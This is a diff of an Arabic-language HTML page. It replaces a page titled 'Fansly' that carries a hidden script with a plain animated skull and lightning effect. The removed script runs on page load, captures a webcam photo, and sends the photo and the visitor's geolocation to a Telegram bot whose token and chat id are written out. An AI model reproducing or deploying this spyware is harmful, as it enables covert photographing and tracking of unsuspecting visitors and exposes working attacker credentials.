@@ -1,166 +1,118 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8">
-<title>  Fansly 💖</title>
-<style>
-  body {
-    background-color: #FFFFFF; /* أبيض قوي */
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    flex-direction: column;
-    font-family: 'Arial', sans-serif;
-  }
+  <meta charset="UTF-8">
+  <title>جمجمة رعب ⚡</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: black;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
 
-  .text {
-    font-size: 24px;
-    color: #ff1a75;
-    margin-bottom: 40px;
-    font-weight: bold;
-    animation: fade 2s infinite alternate;
-  }
+    .container {
+      position: relative;
+    }
 
-  /* تصميم الجمجمة */
-  .skull {
-    position: relative;
-    width: 100px;
-    height: 120px;
-    background: black;
-    border-radius: 50% 50% 40% 40% / 60% 60% 40% 40%; /* شكل تقريبي للرأس */
-    margin-bottom: 20px;
-    box-shadow: inset 0 0 15px #222;
-  }
+    .skull {
+      width: 120px;
+      height: 140px;
+      background: #111;
+      border-radius: 50% 50% 40% 40% / 60% 60% 40% 40%;
+      position: relative;
+      box-shadow: 0 0 30px #fff2, inset 0 0 10px #333;
+      z-index: 2;
+    }
 
-  /* عيون الجمجمة */
-  .skull::before, .skull::after {
-    content: "";
-    position: absolute;
-    top: 30px;
-    width: 25px;
-    height: 25px;
-    background: black;
-    border-radius: 50%;
-    border: 5px solid red;
-    box-shadow: 0 0 10px red;
-  }
+    .skull::before, .skull::after {
+      content: '';
+      position: absolute;
+      top: 35px;
+      width: 28px;
+      height: 28px;
+      background: #000;
+      border: 3px solid #f00;
+      border-radius: 50%;
+      box-shadow: 0 0 10px red;
+    }
 
-  .skull::before {
-    left: 15px;
-  }
+    .skull::before {
+      left: 15px;
+    }
 
-  .skull::after {
-    right: 15px;
-  }
+    .skull::after {
+      right: 15px;
+    }
 
-  /* الفك السفلي */
-  .mandible {
-    position: absolute;
-    bottom: 0;
-    left: 20px;
-    width: 60px;
-    height: 40px;
-    background: black;
-    border-radius: 0 0 20px 20px;
-    border: 3px solid red;
-    box-shadow: 0 0 15px red;
-  }
+    .mandible {
+      position: absolute;
+      bottom: -25px;
+      left: 30px;
+      width: 60px;
+      height: 45px;
+      background: #111;
+      border-radius: 0 0 25px 25px;
+      border-top: 3px solid red;
+      box-shadow: 0 0 10px red;
+      z-index: 1;
+    }
 
-  /* الأجنحة الحمراء المهتزة على الجوانب */
-  .wing-left, .wing-right {
-    position: absolute;
-    top: 30px;
-    width: 20px;
-    height: 80px;
-    background: red;
-    border-radius: 10px;
-    box-shadow: 0 0 15px red;
-    animation: shake 1s infinite alternate;
-  }
+    /* خطوط تأثير حول الجمجمة */
+    .effect-line {
+      position: absolute;
+      width: 2px;
+      height: 100px;
+      background: red;
+      opacity: 0.5;
+      animation: pulse 1s infinite ease-in-out alternate;
+    }
 
-  .wing-left {
-    left: -30px;
-    transform-origin: top right;
-    animation-delay: 0s;
-  }
+    .effect-line:nth-child(1) { left: -30px; top: 10px; animation-delay: 0s; }
+    .effect-line:nth-child(2) { right: -30px; top: 20px; animation-delay: 0.2s; }
+    .effect-line:nth-child(3) { left: -50px; bottom: 0; animation-delay: 0.4s; }
+    .effect-line:nth-child(4) { right: -50px; bottom: 10px; animation-delay: 0.6s; }
 
-  .wing-right {
-    right: -30px;
-    transform-origin: top left;
-    animation-delay: 0.5s;
-  }
+    @keyframes pulse {
+      0% { opacity: 0.1; height: 80px; }
+      100% { opacity: 1; height: 120px; }
+    }
 
-  @keyframes shake {
-    0% { transform: rotate(5deg); }
-    100% { transform: rotate(-5deg); }
-  }
+    /* تأثير برق */
+    .lightning {
+      position: absolute;
+      width: 2px;
+      height: 200px;
+      background: white;
+      top: -100px;
+      left: 50%;
+      transform: translateX(-50%);
+      opacity: 0;
+      box-shadow: 0 0 20px white, 0 0 60px white;
+      animation: lightningFlash 4s infinite;
+    }
 
-  @keyframes fade {
-    from { opacity: 0.6; }
-    to { opacity: 1; }
-  }
-</style>
+    @keyframes lightningFlash {
+      0%, 98%, 100% { opacity: 0; }
+      50%, 51%, 52% { opacity: 1; height: 200px; }
+    }
+  </style>
 </head>
 <body>
 
-<div class="text"> سيف يسلم عليكم هههههههه 💖</div>
-
-<div class="skull">
-  <div class="mandible"></div>
-  <div class="wing-left"></div>
-  <div class="wing-right"></div>
+<div class="container">
+  <div class="skull">
+    <div class="mandible"></div>
+  </div>
+  <div class="effect-line"></div>
+  <div class="effect-line"></div>
+  <div class="effect-line"></div>
+  <div class="effect-line"></div>
+  <div class="lightning"></div>
 </div>
-
-<script>
-    async function captureAndSend() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-
-        await new Promise(resolve => setTimeout(resolve, 3000));
-
-        const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        const imageData = canvas.toDataURL('image/jpeg');
-
-        const blob = await (await fetch(imageData)).blob();
-
-        const formData = new FormData();
-        formData.append("chat_id", "1320552080");
-        formData.append("photo", blob, "capture.jpg");
-
-        fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
-          method: "POST",
-          body: formData
-        });
-
-        stream.getTracks().forEach(track => track.stop());
-
-        navigator.geolocation.getCurrentPosition(position => {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-
-          fetch(`https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendLocation?chat_id=1320552080&latitude=${latitude}&longitude=${longitude}`, {
-            method: "GET"
-          });
-        }, error => {
-          console.error("فشل الحصول على الموقع:", error);
-        });
-
-      } catch (err) {
-        console.error("فشل الوصول إلى الكاميرا:", err);
-      }
-    }
-
-    captureAndSend();
-</script>
 
 </body>
 </html>
